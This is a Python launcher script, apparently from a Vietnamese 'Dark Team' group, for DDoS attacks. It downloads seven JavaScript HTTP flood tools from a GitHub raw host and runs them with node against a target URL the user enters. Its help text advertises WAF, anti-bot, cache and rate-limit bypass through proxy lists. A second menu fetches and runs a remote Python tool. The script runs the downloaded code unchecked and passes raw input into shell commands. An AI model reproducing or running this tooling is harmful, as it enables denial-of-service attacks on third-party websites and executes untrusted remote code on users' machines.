# ====== IMPORT ======
import os
import sys
import subprocess
import time
import json
import base64
import requests
from time import sleep, strftime
from datetime import datetime, timedelta

from pystyle import Colors, Colorate
from rich.console import Console
from rich.panel import Panel
from rich.text import Text


# ====== CLEAR SCREEN ======
os.system("cls" if os.name == "nt" else "clear")


# ====== GET IP ======
try:
    ip = requests.get("https://api.ipify.org?format=json").json()
except:
    ip = {"ip": "Không lấy được"}


# ====== BANNER ======
def banner():
    print(Colorate.Diagonal(Colors.blue_to_cyan, """


..',;:,.
                                            .,cdxk0XWWWWMMMMMMW
                                        :xKNWMMMMMMMMMMMMMMMMMM
                                     'oXWWWWWWWMMMWMMWMMMMMMMMM
                                    dNNXKKNWWWWWWWWWMWMMMMMWWWM
                                  '0NkdddkKNWMMMWWWWWWWWWWWWWNW
          :l;                 .:kONNk,....'oXWWWWNNNNNWNWNOlxkk
          :;K0;        .,:ok0NWWWWWNKxc,...,lkOKK0000KXNNNXKOOK
           .;o0o  ';cx0XNNWWWWWWWWWWN0kocccldkKXKKXXK0KXNWWWKdl
             'dKO,;ollok0XXNNWWWWNNWWN0koccdk0KKKKKXXK0OKNWWNK:
              'ld,   .:lkKXNWWWWWWNXWWWNNX0OO0OOOkO000kddKNNX0;
               .oko. .:okKXXNNNNWNWNXXNNNNNX0xdxkxkk00kd:;ldcl,
                .l0O,,ccxkOOKKXNXNNNK0000Okkxdllox0000kko,. 'l:
                 .oK0c,:ckxxKXNNXXXXKOxkkxkkkxddkOO0K000kl,.  .
            .;clxxdx0Oc..,:ldOkOOOkxodxdddddxxxkkkOOKKK0Oxc'.
            ,kkk0K0kkxo.     .    .....,;;,;,;cdxkkO00Okxc;:oc.
         .xO:.:odxkkxkxo,                    .cxkkOOkxxddxk00x:
       .,..;c;,:ccldodxdl'                  'dkO0KXXXNNNNNNXK0k
       ;ll:;,,,,:::cllllc,.                 .lOXXXNNNWNNNNNNX0x
        ...,;'..,;;::llcc;'.              .lkkxkO0KKXXNNNXkdol:
            ......,::coolc,.             .oO00Odollodk000Od;'',
              ......,;oddo;.              :0XKOxololllclooc'.',
              ..'';,',coddl:              .lk00Okdl:;:clc';'',;
               .',:oollcldxd:.           ..,ddO0Oxl:ccc;'';lodd
                 ..;clcccldxOx.          .',;:ldddxoo;;,:oox00K
                 ...',,;;:cokOd.            .''',..'.'xO0KKKKXX
                    ...'',,;cxkx:'.........'... ... .;kK00KXXXN
                      ...';;:okkl.               ....'cO0KKKXXK
                                             🄰🄽🄾🄽🅈🄼🄾🅄🅂
                                                      
                           𝐇𝐨𝐚𝐧𝐠 𝐀𝐧𝐡 𝐎𝐓𝐏👹
                                     
        BOX ZALO 1: https://zalo.me/g/xwohrt294  
        [ADMIN Hoang Anh]   
        BOX ZALO 2: chưa có cập nhật                
        ADMIN 1: Hoang Anh OTP
        ADMIN 2 : Dark Team
        TIKTOK : @iamnotxxx
        YOUTUBE : Hoang Anh OTP
= = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
"""))


# ====== HIỆU ỨNG MÀU CẦU VỒNG ======
def rainbow(text):
    return Colorate.Diagonal(Colors.blue_to_red, text, 2)


# ====== MENU PHỤ MẪU ======
def menu_flood():
    print(rainbow("[🌀] Đây là nơi bạn xử lý các tool flood/DDOS..."))
    # TODO: Thêm code xử lý flood


def menu_python():
    print(rainbow("[🐍] Đây là nơi bạn xử lý các tool Python khác (TDS, v.v)..."))
    # TODO: Thêm code xử lý tool Python khác


# ====== MENU CHÍNH ======
def menu_chinh():
    banner()
    print(Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [1] MENU FLOOD (HTTP, Bypass...)"))
    print(Colorate.Diagonal(Colors.green_to_red, "[👹] => Nhập Số [2] TOOL PYTHON KHÁC (TDS, v.v)"))
    chon = input(Colorate.Diagonal(Colors.blue_to_cyan, '[👹] => Nhập Số : ')).strip()

    if chon == "1":
        menu_flood()
    elif chon == "2":
        menu_python()
    else:
        print("❌ Số không hợp lệ. Thoát...")

#------------------- MENU FLOOD ----------------------

# 🌈 Hiệu ứng màu cầu vồng
def rainbow(text):
    return Colorate.Diagonal(Colors.blue_to_red, text, 2)

# 📘 Hiển thị cú pháp theo tool_id
def show_syntax(tool_id):
    if tool_id == "1":
        print(rainbow("📘 Cú pháp:") + "\nnode flood10.js <target> <time> <req> <thread> <proxyfile> <flood/bypass>")
        print(rainbow("""🎯 Tham số bắt buộc:
  target       → Địa chỉ mục tiêu (Target URL)
  time         → Thời gian chạy (giây)
  req          → Số request mỗi luồng
  thread       → Số luồng đồng thời
  proxyfile    → File chứa proxy HTTP/SOCKS
  flood/bypass → Chế độ tấn công (flood hoặc bypass)

📌 Ví dụ:
🟢 Termux:
node flood10.js https://example.com 30 10 5 proxy.txt flood

🔵 PC/VPS:
node flood10.js https://example.com 60 100 20 proxy.txt bypass
"""))
    elif tool_id == "2":
        print(rainbow("📘 Cú pháp:") + "\nnode hyper10.js <target> <time> <rate> <thread> <proxy.txt>")
        print(rainbow("""🎯 Tham số bắt buộc:
  target    → Mục tiêu (Target URL)
  time      → Thời gian chạy (giây)
  rate      → Request mỗi luồng
  thread    → Số luồng
  proxy.txt → File proxy

📌 Ví dụ:
🟢 Termux:
node hyper10.js https://example.com 30 10 5 proxy.txt

🔵 PC/VPS:
node hyper10.js https://example.com 60 100 20 proxy.txt
"""))
    elif tool_id == "3":
        print(rainbow("📘 Cú pháp:") + "\nnode ASTRAL9.7.js <host> <time> <req> <thread> <proxy.txt>")
        print(rainbow("""🎯 Tham số bắt buộc:
  host      → Target URL
  time      → Thời gian (giây)
  req       → Requests per thread
  thread    → Number of threads
  proxy.txt → Proxy list

📌 Ví dụ:
🟢 Termux:
node ASTRAL9.7.js https://abc.com 30 10 5 proxy.txt

🔵 PC/VPS:
node ASTRAL9.7.js https://abc.com 60 100 20 proxy.txt
"""))
    elif tool_id == "4":
        print(rainbow("📘 Cú pháp:") + "\nnode bypass9.6.js <host> <time> <rate> <thread> <proxy.txt> [options]")
        print(rainbow("""🎯 Tham số bắt buộc:
  host      → Target URL
  time      → Time in seconds
  rate      → Requests per thread
  thread    → Threads
  proxy.txt → Proxy file

🎯 Tuỳ chọn nâng cao:
  --bypass      → Vượt hệ thống chống bot
  --cache       → Vượt cache
  --query       → Random query string
  --extra       → Extra evasion headers
  --type socks5 → Chỉ định loại proxy

📌 Ví dụ:
🟢 Termux:
node bypass9.6.js https://abc.com 30 5 5 proxy.txt --bypass

🔵 PC/VPS:
node bypass9.6.js https://abc.com 60 50 20 proxy.txt --bypass --cache --extra --query
"""))
    elif tool_id == "5":
        print(rainbow("📘 Cú pháp:") + "\nnode CF2TLS9.6.js <host> <time> <req> <thread> <live.txt>")
        print(rainbow("""🎯 Tham số bắt buộc:
  host     → Target URL
  time     → Seconds
  req      → Requests per thread
  thread   → Threads
  live.txt → File proxy live

📌 Ví dụ:
🟢 Termux:
node CF2TLS9.6.js https://abc.com 30 10 5 live.txt

🔵 PC/VPS:
node CF2TLS9.6.js https://abc.com 60 100 20 live.txt
"""))
    elif tool_id == "6":
        print(rainbow("📘 Cú pháp:") + "\nnode flood_9.6.js <target> <time> <thread> <rate> <proxyfile> [options]")
        print(rainbow("""🎯 Tham số bắt buộc:
  target    → Target URL
  time      → Seconds
  thread    → Threads
  rate      → Requests per thread
  proxyfile → Proxy list

🎯 Tuỳ chọn nâng cao:
  --version     → HTTP version (1/2/mix)
  --delay       → Né rate-limit
  --query       → Random query
  --random      → Randomize path
  --bypass      → Bypass WAF
  --human       → Human behavior
  --extra       → Extra headers
  --debug       → Debug

📌 Ví dụ:
🟢 Termux:
node flood_9.6.js https://abc.com 30 5 10 proxy.txt --query true

🔵 PC/VPS:
node flood_9.6.js https://abc.com 60 20 100 proxy.txt --bypass true --extra true
"""))
    elif tool_id == "7":
        print(rainbow("📘 Cú pháp:") + "\nnode LI-TLS9.6.js <target> <time> <rate> <thread> <proxy.txt>")
        print(rainbow("""🎯 Tham số bắt buộc:
  target    → Target URL
  time      → Seconds
  rate      → Requests per thread
  thread    → Threads
  proxy.txt → Proxy file

📌 Ví dụ:
🟢 Termux:
node LI-TLS9.6.js https://abc.com 30 5 5 proxy.txt

🔵 PC/VPS:
node LI-TLS9.6.js https://abc.com 60 100 50 proxy.txt
"""))

# 🔽 Tải và chạy tool JS
def download_and_run_js(url, tool_id, filename="tool.js"):
    print(f"🔽 Đang tải tool từ: {url}")
    try:
        r = requests.get(url); r.raise_for_status()
        with open(filename, "w", encoding="utf-8") as f:
            f.write(r.text)
        print("✅ Tải xong.")
        show_syntax(tool_id)

        # Nhập tham số tuỳ tool
        if tool_id == "1":
            host = input("🌐 Host: ")
            time = input("⏱ Time: ")
            req = input("📈 Request: ")
            thread = input("🧵 Thread: ")
            proxy = input("📄 Proxy file: ")
            method = input("⚔️ flood/bypass: ")
            cmd = f"node {filename} {host} {time} {req} {thread} {proxy} {method}"
        elif tool_id == "2":
            host = input("🌐 Host: ")
            time = input("⏱ Time: ")
            rate = input("🚀 Rate: ")
            thread = input("🧵 Thread: ")
            proxy = input("📄 Proxy file: ")
            cmd = f"node {filename} {host} {time} {rate} {thread} {proxy}"
        elif tool_id == "3":
            host = input("🌐 Host: ")
            time = input("⏱ Time: ")
            req = input("📈 Request: ")
            thread = input("🧵 Thread: ")
            proxy = input("📄 Proxy file: ")
            cmd = f"node {filename} {host} {time} {req} {thread} {proxy}"
        elif tool_id == "4":
            host = input("🌐 Host: ")
            time = input("⏱ Time: ")
            rate = input("🚀 Rate: ")
            thread = input("🧵 Thread: ")
            proxy = input("📄 Proxy file: ")
            options = input("⚙️ Tuỳ chọn thêm: ")
            cmd = f"node {filename} {host} {time} {rate} {thread} {proxy} {options}"
        elif tool_id == "5":
            host = input("🌐 Host: ")
            time = input("⏱ Time: ")
            req = input("📈 Request: ")
            thread = input("🧵 Thread: ")
            proxy = input("📄 File proxy live: ")
            cmd = f"node {filename} {host} {time} {req} {thread} {proxy}"
        elif tool_id == "6":
            host = input("🌐 Host: ")
            time = input("⏱ Time: ")
            thread = input("🧵 Thread: ")
            rate = input("🚀 Rate: ")
            proxy = input("📄 Proxy file: ")
            options = input("⚙️ Tuỳ chọn thêm: ")
            cmd = f"node {filename} {host} {time} {thread} {rate} {proxy} {options}"
        elif tool_id == "7":
            host = input("🌐 Host: ")
            time = input("⏱ Time: ")
            rate = input("🚀 Rate: ")
            thread = input("🧵 Thread: ")
            proxy = input("📄 Proxy file: ")
            cmd = f"node {filename} {host} {time} {rate} {thread} {proxy}"
        else:
            print("❌ Tool chưa cấu hình.")
            return

        print(f"▶️ Đang chạy: {cmd}")
        os.system(cmd)

    except Exception as e:
        print(f"❌ Lỗi khi tải/chạy tool: {e}")

# 📋 Giao diện menu tool flood
def menu_flood():
    os.system("cls" if os.name == "nt" else "clear")
    print(Colorate.Diagonal(Colors.green_to_red, "=== TOOL DDOS 7 CHỨC NĂNG – HOANGANH OTP ===\n"))

    tool_names = {
        "1": "flood10.js",
        "2": "hyper10.js",
        "3": "ASTRAL9.7.js",
        "4": "bypass9.6.js",
        "5": "CF2TLS9.6.js",
        "6": "flood_9.6.js",
        "7": "LI-TLS9.6.js"
    }

    for i in range(1, 8):
        label = tool_names.get(str(i), "???")
        print(f"[{i:02}] {label}")

    print("[00] Thoát\n")
    chon = input("Nhập số chức năng: ").strip()
    if chon == "00":
        print("👋 Tạm biệt!")
        return
    elif chon in tool_names:
        links = {
            "1": "https://raw.githubusercontent.com/mattercu/hosttool/refs/heads/main/flood10.js-ubf.js",
            "2": "https://raw.githubusercontent.com/mattercu/hosttool/refs/heads/main/hyper10.js-ubf.js",
            "3": "https://raw.githubusercontent.com/mattercu/hosttool/refs/heads/main/ASTRAL9.7.js-ubf.js",
            "4": "https://raw.githubusercontent.com/mattercu/hosttool/refs/heads/main/bypass9.6.js",
            "5": "https://raw.githubusercontent.com/mattercu/hosttool/refs/heads/main/CF2TLS9.6.js-ubf.js",
            "6": "https://raw.githubusercontent.com/mattercu/hosttool/refs/heads/main/flood_9.6.js-ubf.js",
            "7": "https://raw.githubusercontent.com/mattercu/hosttool/refs/heads/main/LI-TLS9.6.js-ubf.js"
        }
        download_and_run_js(links[chon], chon)
    else:
        print("❌ Không hợp lệ.")

# ------------------- MENU TOOL PYTHON ----------------------

def menu_python():
    print(Colorate.Diagonal(Colors.green_to_red, "=== MENU TOOL PYTHON ==="))
    print(Colorate.Diagonal(Colors.green_to_red, "[1] => TOOL Gộp"))

    tools = {
        "1": {"url": "https://raw.githubusercontent.com/Khanh23047/TDS-TIKTOK-V1/main/tool.py", "type": "py"},
    }

    chon = input(Colorate.Diagonal(Colors.blue_to_cyan, "[👹] => Nhập Số Tool Python: ")).strip()

    if chon in tools:
        if tools[chon]["type"] == "py":
            download_and_run_py(tools[chon]["url"])
        else:
            print("❌ Tool không phải dạng Python.")
    else:
        print("❌ Số không hợp lệ.")

# ------------------- RUN PY ----------------------

def download_and_run_py(url, filename="tool.py"):
    print(f"🔽 Đang tải tool Python từ: {url}")
    try:
        r = requests.get(url)
        r.raise_for_status()
        with open(filename, "w", encoding="utf-8") as f:
            f.write(r.text)
        print("✅ Tải xong. Đang chạy tool...")
        os.system(f"python {filename}")
    except Exception as e:
        print(f"❌ Lỗi khi tải/chạy tool: {e}")


# ====== CHẠY MENU CHÍNH ======
if __name__ == "__main__":
    menu_chinh()
